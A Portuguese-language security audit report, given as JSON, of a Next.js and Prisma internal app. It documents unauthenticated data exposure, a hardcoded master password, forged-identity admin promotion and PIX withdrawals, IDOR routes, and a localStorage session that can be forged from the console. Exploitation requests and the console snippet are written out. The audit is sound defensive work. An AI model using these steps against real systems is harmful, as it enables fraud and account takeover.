@@ -1,0 +1,1082 @@
+{
+  "projeto": "Tech Hub",
+  "repositorio": "tech-hub",
+  "branch": "development",
+  "commit": "da61796",
+  "stack": {
+    "linguagem": "TypeScript 5",
+    "framework": "Next.js 15 (App Router) + React 19",
+    "orm": "Prisma ORM 7.9 com driver adapter @prisma/adapter-pg (PostgreSQL / Neon)",
+    "auth": "Login federado na plataforma Senior (POST /api/auth/senior) + rota legada /api/auth/login. Sessão mantida apenas no localStorage do navegador; NÃO existe cookie de sessão, token assinado nem middleware.ts.",
+    "frontend": "React Client Components (\"use client\"), HeroUI, TanStack Table, Recharts, Tailwind 4",
+    "deploy": "Sem Dockerfile, docker-compose, Helm ou Terraform. Único artefato de CI: .github/workflows/testes.yml (typecheck, Jest, Playwright).",
+    "testes": "Jest (unidade + integracao) e Playwright (E2E)"
+  },
+  "escopo": [
+    "29 route handlers em app/api/** (todos os métodos HTTP exportados)",
+    "8 módulos de domínio em lib/**",
+    "contexts/auth-context.tsx e components/protected-route.tsx (mecanismo de sessão)",
+    "9 páginas de app/** e 17 componentes em components/** (vetores de XSS e gates de papel)",
+    "prisma/schema.prisma e as 4 migrações em prisma/migrations/**",
+    ".env, .gitignore, next.config.mjs, prisma.config.ts, package.json",
+    ".github/workflows/testes.yml",
+    "Histórico git completo (git rev-list --all) em busca de segredos versionados"
+  ],
+  "metodologia": [
+    [
+      "1. Banco sem tranca",
+      "O projeto NÃO usa Supabase, portanto não há RLS. O equivalente nesta stack seria um filtro manual por colaborador_id (ou setor_id) aplicado no servidor dentro de cada query Prisma. A auditoria procurou esse filtro em toda query de listagem, busca, agregação e relatório."
+    ],
+    [
+      "2. Permissão no navegador",
+      "Cada gate de papel do frontend (user?.tipo === \"admin\", podeGerenciarAdmins, ProtectedRoute requiredRole) foi cruzado com o route handler correspondente em app/api/** para confirmar se existe verificação equivalente no servidor."
+    ],
+    [
+      "3. IDOR",
+      "Percorridos os 29 route handlers, um a um, procurando leitura, escrita ou exclusão de objeto por ID vindo de path, query ou body sem verificação de posse. Nenhuma amostragem: a tabela de cobertura lista todas as rotas."
+    ],
+    [
+      "4. Chaves expostas",
+      "Varredura de código-fonte, configs, CI e documentação por credenciais literais, mais git grep sobre todos os commits alcançáveis e verificação de variáveis NEXT_PUBLIC_* que vazariam para o bundle do cliente."
+    ],
+    [
+      "5. Inputs sem tratamento",
+      "Busca por dangerouslySetInnerHTML, innerHTML, eval, new Function, esquema javascript: e por URLs controladas pelo usuário em href/src. Verificada também a existência de biblioteca de sanitização no package.json."
+    ]
+  ],
+  "mecanismo_isolamento": "NÃO EXISTE. Não há Row Level Security nas migrações (nenhum ENABLE ROW LEVEL SECURITY ou CREATE POLICY em prisma/migrations/**), não há middleware.ts, não há cookie de sessão e nenhum route handler deriva a identidade do chamador a partir de credencial verificável. As duas únicas verificações de privilégio existentes (lib/permissoes.ts) recebem a identidade do próprio corpo/query da requisição, ou seja, do atacante.",
+  "achados": [
+    {
+      "id": "F-01",
+      "severidade": "critica",
+      "categoria": "1. Banco sem tranca",
+      "titulo": "Nenhuma query de domínio filtra pelo usuário autenticado: o banco inteiro e legível por qualquer requisição anônima",
+      "arquivos": [
+        {
+          "caminho": "app/api/salgados/dividas/route.ts",
+          "linhas": "27-41, 72-83",
+          "trecho": "const where: Prisma.dividasWhereInput = {};\n\nif (pago === \"true\") where.pago = true;\nelse if (pago === \"false\") where.pago = false;\n\nif (colaboradorId) where.colaborador_id = Number(colaboradorId);\n...\nconst dividas = await prisma.dividas.findMany({\n  where,\n  include: { colaboradores: { select: { nome: true } } },\n  orderBy: { data_inicio: \"desc\" },\n});"
+        },
+        {
+          "caminho": "app/api/certificacoes/route.ts",
+          "linhas": "14-25, 109-120",
+          "trecho": "const where: Prisma.certificacoesWhereInput = {};\n\nif (colaborador_id) where.colaborador_id = Number(colaborador_id);"
+        },
+        {
+          "caminho": "app/api/biblioteca/emprestimos/route.ts",
+          "linhas": "16-27, 83-90",
+          "trecho": "const where: Prisma.emprestimosWhereInput = {};\n\nif (status && status !== \"todos\") where.status = status;\nif (colaboradorId) where.colaborador_id = Number(colaboradorId);"
+        },
+        {
+          "caminho": "app/api/colaboradores/route.ts",
+          "linhas": "20-35, 93-97",
+          "trecho": "const where: Prisma.colaboradoresWhereInput = {};\n\nif (departamento && departamento !== \"todos\") {\n  where.departamento = departamento;\n}"
+        },
+        {
+          "caminho": "app/api/dashboard/route.ts",
+          "linhas": "89-95",
+          "trecho": "const filtroColaborador: { setor_id?: number; id?: number } = {};\nif (setorId !== null) filtroColaborador.setor_id = setorId;\nif (colaboradorId !== null) filtroColaborador.id = colaboradorId;\nconst escopo =\n  Object.keys(filtroColaborador).length > 0\n    ? { colaboradores: filtroColaborador }\n    : {};"
+        },
+        {
+          "caminho": "app/api/ranking/colaboradores/route.ts",
+          "linhas": "6-17",
+          "trecho": "export async function GET() {\n  const colaboradores = await prisma.colaboradores.findMany({\n    select: { id: true, nome: true, email: true, departamento: true, ... },"
+        }
+      ],
+      "porque": "O filtro por colaborador_id existe nas rotas de dívidas, certificações e empréstimos, mas ele vem de um query parameter escolhido pelo cliente (searchParams.get(\"colaborador_id\")) e não de uma sessão verificada no servidor. Quando o parâmetro é omitido, o objeto where fica vazio e a query retorna a tabela inteira. Não existe cookie, token nem middleware que permita ao servidor saber quem está chamando, então não há como aplicar o filtro corretamente. Exploracao: GET /api/salgados/dividas sem nenhum parâmetro, sem cabeçalho algum, devolve todas as dívidas de todos os colaboradores, com nome, item, motivo e valor. O mesmo vale para /api/certificacoes, /api/biblioteca/emprestimos, /api/colaboradores, /api/dashboard e as duas rotas de /api/ranking.",
+      "impacto": "Exposicao integral da base: nomes, e-mails corporativos, departamentos, cargos, histórico financeiro (dívidas e total_gasto_salgados), certificações e empréstimos de todos os colaboradores, para qualquer pessoa que alcance a URL da aplicação.",
+      "condicao": "Nenhuma. Explorabilidade direta por requisição HTTP não autenticada, sem pre-requisito de configuração."
+    },
+    {
+      "id": "F-02",
+      "severidade": "critica",
+      "categoria": "4. Chaves expostas",
+      "titulo": "Senha mestra \"123456\" embutida no código autentica qualquer colaborador da base",
+      "arquivos": [
+        {
+          "caminho": "app/api/auth/login/route.ts",
+          "linhas": "35-42",
+          "trecho": "const isPasswordValid = password === \"123456\";\n\nif (!isPasswordValid) {\n  return NextResponse.json(\n    { error: \"Credenciais inválidas\" },\n    { status: 401 },\n  );\n}"
+        },
+        {
+          "caminho": "app/api/auth/login/route.ts",
+          "linhas": "15-26",
+          "trecho": "const user = await prisma.colaboradores.findUnique({\n  where: { email },\n  select: { id: true, nome: true, email: true, senha: true, ... },\n});"
+        },
+        {
+          "caminho": "prisma/schema.prisma",
+          "linhas": "30",
+          "trecho": "senha                String?         @db.VarChar"
+        }
+      ],
+      "porque": "A rota busca o colaborador pelo e-mail e então ignora completamente a coluna senha retornada do banco, comparando a senha enviada contra a constante literal \"123456\". Qualquer pessoa que conheça (ou adivinhe) um e-mail corporativo existente obtém um objeto de usuário válido — incluindo tipo, que o frontend usa como papel. Combinado com F-08 (sessão apenas no localStorage), isso entrega uma identidade completa. A coluna senha existe no schema mas nunca é verificada nem tem hash.",
+      "impacto": "Autenticação totalmente contornável. Um e-mail válido de admin permanente rende acesso administrativo completo ao sistema.",
+      "condicao": "A rota /api/auth/login está publicada e responde, embora o fluxo de login da interface use /api/auth/senior. Basta um POST direto."
+    },
+    {
+      "id": "F-03",
+      "severidade": "critica",
+      "categoria": "2. Permissão no navegador",
+      "titulo": "Saque PIX real autoriza-se com um colaborador_id enviado pelo próprio atacante",
+      "arquivos": [
+        {
+          "caminho": "app/api/salgados/transferencias/route.ts",
+          "linhas": "37-47",
+          "trecho": "export async function POST(req: NextRequest) {\n  const { colaborador_id, amount, description, pix_key, pix_key_type } =\n    await req.json();\n\n  if (!(await ehAdmin(Number(colaborador_id)))) {\n    return NextResponse.json(\n      { error: \"Apenas administradores podem solicitar saques\" },\n      { status: 403 },\n    );\n  }"
+        },
+        {
+          "caminho": "app/api/salgados/transferencias/route.ts",
+          "linhas": "73-80",
+          "trecho": "const transferencia = await enviarPix({\n  amount: paraCentavos(valor),\n  externalId: crypto.randomUUID(),\n  description: String(description ?? \"\").trim() || \"Saque de salgados\",\n  pix: { key: normalizarChave(chave, tipo), type: tipo },\n});"
+        },
+        {
+          "caminho": "lib/permissoes.ts",
+          "linhas": "16-33",
+          "trecho": "export async function ehAdmin(colaboradorId?: number | null) {\n  if (!Number.isFinite(Number(colaboradorId))) return false;\n  const colaborador = await prisma.colaboradores.findUnique({\n    where: { id: Number(colaboradorId) },\n    select: { tipo: true, admin_permanente: true, admin_temporario_ate: true },\n  });"
+        },
+        {
+          "caminho": "app/salgados/page.tsx",
+          "linhas": "460-469",
+          "trecho": "const response = await fetch(\"/api/salgados/transferencias\", {\n  method: \"POST\",\n  headers: { \"Content-Type\": \"application/json\" },\n  body: JSON.stringify({\n    colaborador_id: user.id,\n    amount: valor,"
+        }
+      ],
+      "porque": "ehAdmin consulta o banco corretamente, mas o identificador que ela recebe vem do corpo JSON da requisição. O servidor pergunta \"esse id é de um admin?\" em vez de \"quem está chamando e admin?\". O atacante envia colaborador_id de qualquer administrador (ids são inteiros sequenciais e a lista de admins e pública via GET /api/admin/usuarios, ou simplesmente forca bruta de 1 a N) junto com a própria chave PIX, e a rota executa enviarPix contra a API de produção da AbacatePay. O valor mínimo e R$ 1,00 e não existe teto.",
+      "impacto": "Saque de fundos reais da conta AbacatePay da empresa para uma chave PIX arbitrária escolhida pelo atacante. Perda financeira direta.",
+      "condicao": "Requer que API_KEY_ABACATEPAY_V2 esteja configurada (ambiente já em uso) e que haja saldo disponível na loja — saldo esse que F-04 expõe publicamente."
+    },
+    {
+      "id": "F-04",
+      "severidade": "critica",
+      "categoria": "2. Permissão no navegador",
+      "titulo": "Gestão de administradores autoriza-se por um e-mail enviado na query string",
+      "arquivos": [
+        {
+          "caminho": "app/api/admin/usuarios/route.ts",
+          "linhas": "32-43",
+          "trecho": "const { searchParams } = new URL(request.url);\nconst userEmail = searchParams.get(\"user_email\");\n\nif (!(await ehAdminPermanente(userEmail))) {\n  return NextResponse.json(\n    { error: \"Acesso negado. Apenas admins permanentes podem acessar esta funcionalidade.\" },\n    { status: 403 },\n  );\n}"
+        },
+        {
+          "caminho": "app/api/admin/usuarios/route.ts",
+          "linhas": "127-138",
+          "trecho": "const body = await request.json();\nconst { colaborador_id, admin_ate, user_email, admin_permanente } = body;\n\nif (!(await ehAdminPermanente(user_email))) {"
+        },
+        {
+          "caminho": "app/api/admin/usuarios/route.ts",
+          "linhas": "235-247",
+          "trecho": "const colaborador_id = searchParams.get(\"colaborador_id\");\nconst user_email = searchParams.get(\"user_email\");\n\nif (!(await ehAdminPermanente(user_email))) {"
+        },
+        {
+          "caminho": "app/api/admin/usuarios/route.ts",
+          "linhas": "207-215",
+          "trecho": "await prisma.colaboradores.update({\n  where: { id: colaborador.id },\n  data: {\n    admin_permanente: permanente,\n    admin_temporario_ate: dataAdmin,\n    tipo: \"admin\",\n    updated_at: new Date(),\n  },\n});"
+        },
+        {
+          "caminho": "app/admin/page.tsx",
+          "linhas": "201-203",
+          "trecho": "? fetch(\n    `/api/admin/usuarios?escopo=candidatos&user_email=${encodeURIComponent(emailUsuário)}`,\n  )"
+        }
+      ],
+      "porque": "Os três métodos (GET, POST, DELETE) derivam a identidade do chamador de um parâmetro de texto que o cliente controla. O e-mail de um admin permanente não é secreto: ele aparece no próprio GET desta rota, na listagem pública de /api/colaboradores (F-01) e no domínio corporativo. Bastando conhecer um e-mail de admin permanente, o atacante faz POST /api/admin/usuarios com {\"colaborador_id\": <seu_id>, \"admin_permanente\": true, \"user_email\": \"<admin>@empresa\"} e se promove a administrador permanente. A proteção ehOProprioUsuário (linhas 19-28) não ajuda: ela compara o alvo com o e-mail forjado, não com o atacante.",
+      "impacto": "Escalonamento de privilégio de anônimo para administrador permanente, que é o papel de maior autoridade do sistema. A partir daí, todo o painel /admin fica coerente para o atacante.",
+      "condicao": "Nenhuma além de conhecer um e-mail de admin permanente, que o próprio sistema expõe."
+    },
+    {
+      "id": "F-05",
+      "severidade": "critica",
+      "categoria": "2. Permissão no navegador",
+      "titulo": "CRUD de setores no painel administrativo não tem nenhuma verificação no servidor",
+      "arquivos": [
+        {
+          "caminho": "app/api/admin/setores/route.ts",
+          "linhas": "51-56",
+          "trecho": "export async function GET(req: NextRequest) {\n  try {\n    const page = req.nextUrl.searchParams.get(\"page\");\n    const limit = req.nextUrl.searchParams.get(\"limit\");\n    const search = req.nextUrl.searchParams.get(\"search\");"
+        },
+        {
+          "caminho": "app/api/admin/setores/route.ts",
+          "linhas": "119-124",
+          "trecho": "export async function POST(req: NextRequest) {\n  try {\n    const body = await req.json();\n    const { nome, descricao } = body;\n\n    if (!nome) {"
+        },
+        {
+          "caminho": "app/api/admin/setores/[id]/route.ts",
+          "linhas": "41-49",
+          "trecho": "export async function PUT(\n  req: NextRequest,\n  { params }: { params: Promise<{ id: string }> },\n) {\n  try {\n    const { id: idParam } = await params;\n    const id = Number(idParam);\n    const body = await req.json();"
+        },
+        {
+          "caminho": "app/api/admin/setores/[id]/route.ts",
+          "linhas": "85-95",
+          "trecho": "export async function DELETE(\n  req: NextRequest,\n  { params }: { params: Promise<{ id: string }> },\n) {\n  try {\n    const { id: idParam } = await params;\n    const id = Number(idParam);"
+        },
+        {
+          "caminho": "components/protected-route.tsx",
+          "linhas": "45-58",
+          "trecho": "if (requiredRole === \"admin\" && user.tipo !== \"admin\") {\n  return (\n    <div className=\"min-h-screen flex items-center justify-center\">\n      <h1 className=\"text-2xl font-bold text-red-600 mb-4\">Acesso Negado</h1>"
+        }
+      ],
+      "porque": "Nenhum dos cinco handlers deste recurso importa lib/permissoes.ts nem lê qualquer credencial. A única barreira e ProtectedRoute requiredRole=\"admin\" na página /admin, que roda no navegador e decide a partir de user.tipo lido do localStorage. Chamar a API diretamente (curl, fetch de outra aba, Postman) ignora a página inteira. Note o contraste com a rota vizinha /api/admin/usuarios, que ao menos tenta verificar — aqui não há nem tentativa.",
+      "impacto": "Qualquer anônimo cria, renomeia e exclui setores da organização e lê a listagem completa de setores com nome, e-mail, cargo e status de todos os colaboradores vinculados (GET de [id], linhas 14-22).",
+      "condicao": "Nenhuma."
+    },
+    {
+      "id": "F-06",
+      "severidade": "critica",
+      "categoria": "3. IDOR",
+      "titulo": "PATCH /api/colaboradores/[id] altera o cadastro de qualquer colaborador, inclusive CPF, e-mail e status",
+      "arquivos": [
+        {
+          "caminho": "app/api/colaboradores/[id]/route.ts",
+          "linhas": "47-68",
+          "trecho": "export async function PATCH(\n  req: NextRequest,\n  { params }: { params: Promise<{ id: string }> },\n) {\n  try {\n    const { id: idParam } = await params;\n    const id = Number(idParam);\n    const body = await req.json();\n\n    const {\n      document, country_code, area_code, number,\n      nome, email, departamento, cargo, setor_id, status, data_admissao,\n    } = body;"
+        },
+        {
+          "caminho": "app/api/colaboradores/[id]/route.ts",
+          "linhas": "70-80",
+          "trecho": "const existing = await prisma.colaboradores.findUnique({\n  where: { id },\n  select: { id: true, email: true },\n});\n\nif (!existing) {\n  return NextResponse.json(\n    { error: \"Colaborador não encontrado\" },\n    { status: 404 },\n  );\n}"
+        },
+        {
+          "caminho": "app/api/colaboradores/[id]/route.ts",
+          "linhas": "194-198",
+          "trecho": "const colaborador = await prisma.colaboradores.update({\n  where: { id },\n  data,\n  select: { ...COLABORADOR_SELECT_SEGURO, setores: { select: { nome: true } } },\n});"
+        },
+        {
+          "caminho": "app/salgados/pagar/[id]/page.tsx",
+          "linhas": "343-352",
+          "trecho": "const response = await fetch(`/api/colaboradores/${user?.id}`, {\n  method: \"PATCH\",\n  headers: { \"Content-Type\": \"application/json\" },\n  body: JSON.stringify({\n    document: cpfLimpo,\n    country_code: ddiLimpo,\n    area_code: dddLimpo,\n    number: numeroLimpo,\n  }),\n});"
+        }
+      ],
+      "porque": "O handler busca o registro apenas para responder 404 quando ele não existe; não há nenhuma comparação entre o id do path e a identidade do chamador (que sequer existe no servidor). A validação de campos e cuidadosa — nome vazio, e-mail duplicado, status fora do enum e data inválida são todos rejeitados — mas isso válida o formato, não a autorização. O frontend em /salgados/pagar/[id] chama a rota com user?.id vindo do localStorage; trocar esse número por qualquer outro no DevTools ou no curl e suficiente.",
+      "impacto": "Sequestro de conta e fraude no fluxo de pagamento: trocar o e-mail de um colaborador redireciona o vínculo do login federado; trocar document (CPF) e number (telefone) injeta os dados do atacante na cobrança PIX gerada em /api/salgados/pagamentos (linhas 96-130), que usa exatamente esses campos como customer. Tambem permite desativar colaboradores em massa via status: \"inativo\".",
+      "condicao": "Nenhuma."
+    },
+    {
+      "id": "F-07",
+      "severidade": "critica",
+      "categoria": "3. IDOR",
+      "titulo": "PATCH /api/salgados/dividas/[id] quita qualquer dívida sem pagar e corrompe o total gasto do colaborador",
+      "arquivos": [
+        {
+          "caminho": "app/api/salgados/dividas/[id]/route.ts",
+          "linhas": "39-48",
+          "trecho": "const CAMPOS_ATUALIZAVEIS = [\"item\", \"motivo\", \"data_inicio\", \"valor\", \"pago\"] as const;\n\nexport async function PATCH(\n  req: NextRequest,\n  { params }: { params: Promise<{ id: string }> },\n) {\n  try {\n    const { id: idParam } = await params;\n    const id = Number(idParam);\n    const body = await req.json();"
+        },
+        {
+          "caminho": "app/api/salgados/dividas/[id]/route.ts",
+          "linhas": "77-100",
+          "trecho": "const atualizada = await tx.dividas.update({\n  where: { id },\n  data: { ...data, updated_at: new Date() },\n});\n\nif (body.pago === true && !existente.pago) {\n  await tx.colaboradores.update({\n    where: { id: existente.colaborador_id },\n    data: {\n      total_gasto_salgados: { increment: existente.valor },\n      updated_at: new Date(),\n    },\n  });\n}"
+        },
+        {
+          "caminho": "app/api/salgados/dividas/route.ts",
+          "linhas": "93-114",
+          "trecho": "export async function POST(req: NextRequest) {\n  const body = await req.json();\n  const { colaborador_id, item, motivo, data_inicio, valor } = body;\n  ...\n  const divida = await prisma.dividas.create({\n    data: { colaborador_id: Number(colaborador_id), item, ... },\n  });"
+        }
+      ],
+      "porque": "A transação carrega o registro existente apenas para ler colaborador_id, valor e pago — nunca para verificar posse. Um PATCH com {\"pago\": true} marca a dívida como quitada sem que nenhum PIX tenha sido gerado ou pago, contornando por completo o fluxo AbacatePay implementado em lib/pagamentos.ts. O campo valor também e atualizável, então a dívida pode ser zerada antes de ser quitada. Em sentido inverso, {\"pago\": false} decrementa total_gasto_salgados de terceiros. O POST irmão (dívidas/route.ts:93) permite ainda criar dívidas em nome de qualquer colaborador_id.",
+      "impacto": "Fraude financeira direta no módulo de salgados: dívidas quitadas sem pagamento, valores adulterados e o indicador total_gasto_salgados — usado no dashboard e no ranking — manipulável para qualquer pessoa.",
+      "condicao": "Nenhuma."
+    },
+    {
+      "id": "F-08",
+      "severidade": "alta",
+      "categoria": "2. Permissão no navegador",
+      "titulo": "A sessão vive apenas no localStorage, sem token assinado: a identidade e o papel são editáveis pelo usuário",
+      "arquivos": [
+        {
+          "caminho": "contexts/auth-context.tsx",
+          "linhas": "35-41",
+          "trecho": "useEffect(() => {\n  const savedUser = localStorage.getItem(\"user\");\n  if (savedUser) {\n    setUser(JSON.parse(savedUser));\n  }\n  setIsLoading(false);\n}, []);"
+        },
+        {
+          "caminho": "contexts/auth-context.tsx",
+          "linhas": "65-68",
+          "trecho": "setUser(data.user);\nlocalStorage.setItem(\"user\", JSON.stringify(data.user));\nsetIsLoading(false);\nreturn true;"
+        },
+        {
+          "caminho": "app/api/auth/senior/route.ts",
+          "linhas": "180-183",
+          "trecho": "return NextResponse.json({\n  user,\n  message: \"Login realizado com sucesso\",\n});"
+        },
+        {
+          "caminho": "components/protected-route.tsx",
+          "linhas": "22-35",
+          "trecho": "useEffect(() => {\n  if (!isLoading && !user) {\n    router.push(\"/login\");\n  }\n\n  if (!isLoading && user && requiredRole === \"admin\" && user.tipo !== \"admin\") {\n    router.push(\"/\");\n  }\n}, [user, isLoading, router, requiredRole]);"
+        }
+      ],
+      "porque": "A rota de login válida corretamente as credenciais contra a plataforma Senior e até sincroniza o papel no banco (linhas 101-133), mas devolve o objeto de usuário como JSON simples. Não há Set-Cookie, não há JWT assinado, não há registro de sessão no servidor. O objeto é persistido em localStorage e e a única fonte de verdade do frontend. Executar localStorage.setItem(\"user\", JSON.stringify({id: 1, tipo: \"admin\", email: \"admin@empresa\", admin_permanente: true})) no console libera toda a interface administrativa. Como o servidor não lê nada disso, essa falsificação não e detectável — e também não precisa ser, já que as rotas sensíveis (F-03 a F-07) não verificam nada.",
+      "impacto": "Não existe sessão autenticada no sentido técnico. Todo controle de acesso do produto é decorativo, e o access_token da plataforma Senior fica armazenado em localStorage, acessível a qualquer script na origem.",
+      "condicao": "Nenhuma. Acesso ao DevTools do próprio navegador."
+    },
+    {
+      "id": "F-09",
+      "severidade": "alta",
+      "categoria": "1. Banco sem tranca",
+      "titulo": "Saldo financeiro da conta AbacatePay exposto sem autenticação",
+      "arquivos": [
+        {
+          "caminho": "app/api/salgados/saldo/route.ts",
+          "linhas": "4-7",
+          "trecho": "export async function GET() {\n  try {\n    const saldo = await consultarSaldoLoja();\n    return NextResponse.json(saldo);"
+        },
+        {
+          "caminho": "lib/abacatepay.ts",
+          "linhas": "217-229",
+          "trecho": "export async function consultarSaldoLoja(): Promise<SaldoLoja> {\n  const loja = await requisitar<Record<string, any>>(\"v1\", \"/store/get\");\n  const saldo = (loja.balance ?? loja) as Record<string, unknown>;\n\n  return {\n    disponivel: paraReais(...),\n    pendente: paraReais(...),\n    bloqueado: paraReais(...),\n  };\n}"
+        },
+        {
+          "caminho": "app/salgados/page.tsx",
+          "linhas": "219",
+          "trecho": "const response = await fetch(\"/api/salgados/saldo\");"
+        }
+      ],
+      "porque": "O handler não recebe nem inspeciona qualquer parâmetro de identidade: chama direto a API v1 da AbacatePay com a chave do servidor e devolve o saldo. No frontend, o card de saldo fica atrás do gate ehAdmin de app/salgados/page.tsx:197, mas a rota não replica essa condição. GET /api/salgados/saldo responde a qualquer um.",
+      "impacto": "Vazamento de informação financeira da empresa (disponível, pendente, bloqueado) e, sobretudo, reconhecimento para F-03: o atacante descobre exatamente quanto há para sacar antes de disparar a transferência PIX.",
+      "condicao": "Requer API_KEY_ABACATEPAY_V1 configurada, o que já e o caso no ambiente em uso."
+    },
+    {
+      "id": "F-10",
+      "severidade": "alta",
+      "categoria": "2. Permissão no navegador",
+      "titulo": "Gates de papel de biblioteca e certificações não têm contrapartida no servidor",
+      "arquivos": [
+        {
+          "caminho": "app/biblioteca/page.tsx",
+          "linhas": "376",
+          "trecho": "const ehAdmin = user?.tipo === \"admin\";"
+        },
+        {
+          "caminho": "app/biblioteca/page.tsx",
+          "linhas": "562",
+          "trecho": "{user?.tipo === \"admin\" && ("
+        },
+        {
+          "caminho": "app/certificacoes/page.tsx",
+          "linhas": "337-340",
+          "trecho": "return user?.tipo === \"admin\" || certificacao.colaborador_id === user?.id;\n}\n\nconst ehAdmin = user?.tipo === \"admin\";"
+        },
+        {
+          "caminho": "app/certificacoes/page.tsx",
+          "linhas": "572",
+          "trecho": "{user?.tipo === \"admin\" && ("
+        },
+        {
+          "caminho": "app/api/biblioteca/livros/route.ts",
+          "linhas": "42-46",
+          "trecho": "export async function POST(req: NextRequest) {\n  try {\n    const body = await req.json();\n    const { titulo, autor, genero, isbn, capa } = body;"
+        },
+        {
+          "caminho": "app/api/certificacoes/route.ts",
+          "linhas": "130-142",
+          "trecho": "export async function POST(request: NextRequest) {\n  try {\n    const body = await request.json();\n    const {\n      colaborador_id, nome, tipo, instituicao, ...\n    } = body;"
+        }
+      ],
+      "porque": "podeEditarCertificacao (certificações/page.tsx:336-338) implementa a regra de negócio correta — admin ou dono do registro — mas apenas para decidir se o botão aparece. Os handlers correspondentes em app/api/certificacoes/** e app/api/biblioteca/** não reproduzem nenhuma das duas condições. O mesmo vale para os botões de cadastro e exclusão de livros. A lógica de autorização existe e está escrita corretamente; ela só foi escrita no lado errado da fronteira de confiança.",
+      "impacto": "Cadastro, edição e exclusão de livros, empréstimos e certificações por qualquer anônimo, incluindo certificações lançadas em nome de terceiros (colaborador_id arbitrário no POST).",
+      "condicao": "Nenhuma."
+    },
+    {
+      "id": "F-11",
+      "severidade": "alta",
+      "categoria": "3. IDOR",
+      "titulo": "Certificacoes: PATCH e DELETE por ID sem verificação de posse",
+      "arquivos": [
+        {
+          "caminho": "app/api/certificacoes/[id]/route.ts",
+          "linhas": "52-59",
+          "trecho": "export async function PATCH(\n  request: NextRequest,\n  { params }: { params: Promise<{ id: string }> },\n) {\n  try {\n    const { id: idParam } = await params;\n    const id = Number(idParam);\n    const body = await request.json();"
+        },
+        {
+          "caminho": "app/api/certificacoes/[id]/route.ts",
+          "linhas": "98-101",
+          "trecho": "await prisma.certificacoes.update({\n  where: { id },\n  data: { ...data, updated_at: new Date() },\n});"
+        },
+        {
+          "caminho": "app/api/certificacoes/[id]/route.ts",
+          "linhas": "121-128",
+          "trecho": "export async function DELETE(\n  request: NextRequest,\n  { params }: { params: Promise<{ id: string }> },\n) {\n  try {\n    const { id: idParam } = await params;\n    const id = Number(idParam);\n    await prisma.certificacoes.delete({ where: { id } });"
+        }
+      ],
+      "porque": "O where do Prisma contem apenas { id }. Não há cláusula de posse (colaborador_id) nem verificação de papel. O DELETE em particular executa a exclusão direto, sem sequer carregar o registro antes — a única ramificação e o tratamento de isRecordNotFoundError. Um laço de id=1 até N apaga toda a tabela de certificações.",
+      "impacto": "Destruição ou adulteração do histórico de certificações de qualquer colaborador. Como a tabela alimenta /api/ranking e /api/dashboard, também corrompe os indicadores da organização.",
+      "condicao": "Nenhuma."
+    },
+    {
+      "id": "F-12",
+      "severidade": "alta",
+      "categoria": "3. IDOR",
+      "titulo": "Biblioteca: livros e empréstimos alteráveis e excluíveis por ID sem posse",
+      "arquivos": [
+        {
+          "caminho": "app/api/biblioteca/livros/[id]/route.ts",
+          "linhas": "33-41",
+          "trecho": "export async function PUT(\n  req: NextRequest,\n  { params }: { params: Promise<{ id: string }> },\n) {\n  try {\n    const { id: idParam } = await params;\n    const id = Number(idParam);\n    const body = await req.json();"
+        },
+        {
+          "caminho": "app/api/biblioteca/livros/[id]/route.ts",
+          "linhas": "111-114",
+          "trecho": "const livro = await prisma.livros.update({\n  where: { id },\n  data: { ...data, updated_at: new Date() },\n});"
+        },
+        {
+          "caminho": "app/api/biblioteca/livros/[id]/route.ts",
+          "linhas": "152",
+          "trecho": "await prisma.livros.delete({ where: { id } });"
+        },
+        {
+          "caminho": "app/api/biblioteca/emprestimos/[id]/route.ts",
+          "linhas": "43-51",
+          "trecho": "export async function PATCH(\n  req: NextRequest,\n  { params }: { params: Promise<{ id: string }> },\n) {\n  try {\n    const { id: idParam } = await params;\n    const id = Number(idParam);\n    const body = await req.json();\n    const { data_real_devolucao, status } = body;"
+        },
+        {
+          "caminho": "app/api/biblioteca/emprestimos/[id]/route.ts",
+          "linhas": "63-72",
+          "trecho": "const atualizado = await tx.emprestimos.update({\n  where: { id },\n  data: {\n    data_real_devolucao: data_real_devolucao ? new Date(data_real_devolucao) : null,\n    status: status || \"devolvido\",\n    updated_at: new Date(),\n  },\n});"
+        }
+      ],
+      "porque": "Todos os handlers operam sobre where: { id } sem qualquer predicado de dono. O PATCH de livros aceita o campo disponível (CAMPOS_ATUALIZAVEIS, linha 79-86), o que permite marcar como disponível um livro que está emprestado e assim contornar a checagem da linha 141-150 do DELETE. O PATCH de empréstimos devolve o livro de outra pessoa em nome dela.",
+      "impacto": "Adulteração e exclusão do acervo e do histórico de empréstimos, inclusive registros de terceiros. Impacto operacional, sem componente financeiro.",
+      "condicao": "Nenhuma."
+    },
+    {
+      "id": "F-13",
+      "severidade": "alta",
+      "categoria": "1. Banco sem tranca",
+      "titulo": "Agregações e relatórios entregam números da organização inteira sem escopo de chamador",
+      "arquivos": [
+        {
+          "caminho": "app/api/dashboard/route.ts",
+          "linhas": "66-78",
+          "trecho": "export async function GET(request: NextRequest) {\n  const params = request.nextUrl.searchParams;\n  const mesesBrutos = Number(params.get(\"meses\") ?? 6);\n  const setorParam = params.get(\"setorId\");\n  const colaboradorParam = params.get(\"colaboradorId\");"
+        },
+        {
+          "caminho": "app/api/ranking/estatisticas/route.ts",
+          "linhas": "6-19",
+          "trecho": "export async function GET() {\n  const [\n    totalColaboradores, totalCertificacoes, ...\n  ] = await prisma.$transaction([\n    prisma.colaboradores.count(),\n    prisma.certificacoes.count(),"
+        },
+        {
+          "caminho": "app/api/salgados/dividas/route.ts",
+          "linhas": "18-25",
+          "trecho": "if (motivosOnly === \"true\") {\n  const result = await prisma.dividas.findMany({\n    where: { AND: [{ motivo: { not: null } }, { motivo: { not: \"\" } }] },\n    distinct: [\"motivo\"],\n    select: { motivo: true },\n  });\n  return NextResponse.json(result.map((r) => r.motivo));\n}"
+        },
+        {
+          "caminho": "app/api/certificacoes/route.ts",
+          "linhas": "32-34",
+          "trecho": "const escopo: Prisma.certificacoesWhereInput = colaborador_id\n  ? { colaborador_id: Number(colaborador_id) }\n  : {};"
+        }
+      ],
+      "porque": "Os parâmetros setorId e colaboradorId do dashboard são filtros de apresentação escolhidos pelo cliente, não limites de segurança: omiti-los devolve a visão global. /api/ranking/estatisticas e /api/ranking/colaboradores não aceitam parâmetro algum e sempre respondem com a organização inteira. A variante motivos_only=true de /api/salgados/dividas devolve a lista distinta de motivos de dívida de todos, que frequentemente carrega contexto pessoal em texto livre.",
+      "impacto": "Perfilamento completo da organização por um anônimo: estrutura de setores, ranking nominal de colaboradores, valores financeiros agregados e motivos de dívida em texto livre.",
